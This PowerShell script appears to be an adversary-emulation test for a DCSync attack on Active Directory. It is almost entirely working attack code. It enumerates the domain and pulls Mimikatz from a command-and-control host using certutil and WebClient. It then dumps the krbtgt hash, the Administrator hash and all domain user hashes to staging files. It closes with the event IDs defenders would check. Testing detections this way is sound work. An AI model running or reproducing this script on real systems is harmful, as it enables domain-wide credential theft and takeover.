$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }
$TargetIP = if ($env:TARGET_IP) { $env:TARGET_IP } else { "192.168.1.10" }

Write-Host "[*] Starting Identity Attack - DCSync (Mimikatz lsadump::dcsync)..." -ForegroundColor Cyan

# T1003.006 - OS Credential Dumping: DCSync
# Replicates password data from the DC using Directory Replication Service (DRS)
# Requires: Domain Admin or Replicating Directory Changes privileges

Write-Host "[!] Requires: Domain Admin or accounts with Replicating Directory Changes rights" -ForegroundColor Yellow
Write-Host "[!] Target DC: $TargetIP" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
$mimikatzPath = "$stagingDir\mimikatz.exe"

# Step 1: Enumerate domain info
Write-Host "`n[*] [T1018] Enumerating domain information..." -ForegroundColor Yellow
Write-Host "    CMD: nltest /dsgetdc: /force"
$dcInfo = nltest /dsgetdc: /force 2>&1
Write-Host $dcInfo

Write-Host "`n[*] Gathering domain SID..."
Write-Host "    CMD: whoami /user"
whoami /user

Write-Host "`n[*] Identifying current domain..."
Write-Host "    CMD: [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()"
try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $domainName = $domain.Name
    Write-Host "[+] Domain: $domainName" -ForegroundColor Green
    Write-Host "[+] Domain Controller: $($domain.PdcRoleOwner)" -ForegroundColor Green
} catch {
    $domainName = $env:USERDNSDOMAIN
    Write-Host "[*] Domain from env: $domainName" -ForegroundColor Yellow
}

# Step 2: Download Mimikatz
Write-Host "`n[*] [T1105] Downloading Mimikatz for DCSync..." -ForegroundColor Yellow
Write-Host "    CMD: certutil -urlcache -split -f http://$C2Host/tools/mimikatz.exe $mimikatzPath"
certutil -urlcache -split -f "http://$C2Host/tools/mimikatz.exe" $mimikatzPath

if (-not (Test-Path $mimikatzPath)) {
    Write-Host "[-] Certutil download failed. Trying WebClient..." -ForegroundColor Red
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://$C2Host/tools/mimikatz.exe", $mimikatzPath)
    } catch {
        Write-Host "[-] All download methods failed." -ForegroundColor Red
    }
}

if (Test-Path $mimikatzPath) {
    Write-Host "[+] Mimikatz staged successfully" -ForegroundColor Green

    # Step 3: DCSync - krbtgt account (used for Golden Ticket)
    Write-Host "`n[*] [T1003.006] DCSync - Replicating krbtgt hash..." -ForegroundColor Yellow
    Write-Host "    CMD: mimikatz.exe `"privilege::debug`" `"lsadump::dcsync /user:krbtgt`" `"exit`""
    $krbtgtOutput = "$stagingDir\dcsync_krbtgt.txt"
    & $mimikatzPath "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit" 2>&1 | Tee-Object -FilePath $krbtgtOutput

    if (Test-Path $krbtgtOutput) {
        $lineCount = (Get-Content $krbtgtOutput | Measure-Object).Count
        Write-Host "`n[+] DCSync krbtgt output saved: $krbtgtOutput ($lineCount lines)" -ForegroundColor Green
    }

    # Step 4: DCSync - Administrator account
    Write-Host "`n[*] [T1003.006] DCSync - Replicating Administrator hash..." -ForegroundColor Yellow
    Write-Host "    CMD: mimikatz.exe `"lsadump::dcsync /user:Administrator`" `"exit`""
    $adminOutput = "$stagingDir\dcsync_admin.txt"
    & $mimikatzPath "privilege::debug" "lsadump::dcsync /user:Administrator" "exit" 2>&1 | Tee-Object -FilePath $adminOutput

    # Step 5: DCSync - all users (full domain dump)
    Write-Host "`n[*] [T1003.006] DCSync - Replicating all domain hashes..." -ForegroundColor Yellow
    Write-Host "    CMD: mimikatz.exe `"lsadump::dcsync /all /csv`" `"exit`""
    $allOutput = "$stagingDir\dcsync_all.txt"
    & $mimikatzPath "privilege::debug" "lsadump::dcsync /all /csv" "exit" 2>&1 | Tee-Object -FilePath $allOutput

} else {
    Write-Host "[-] Cannot execute DCSync - Mimikatz not available" -ForegroundColor Red
    Write-Host "[!] Ensure http://$C2Host/tools/mimikatz.exe is accessible" -ForegroundColor Yellow
}

Write-Host "`n[+] DCSync Attack Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: DRS replication traffic, 4662 events, Mimikatz execution, LSASS access" -ForegroundColor Yellow
Write-Host "[!] Key Event IDs: 4662 (DS-Replication-Get-Changes), 4624 (Logon), 5136 (Directory Service Changes)" -ForegroundColor Yellow
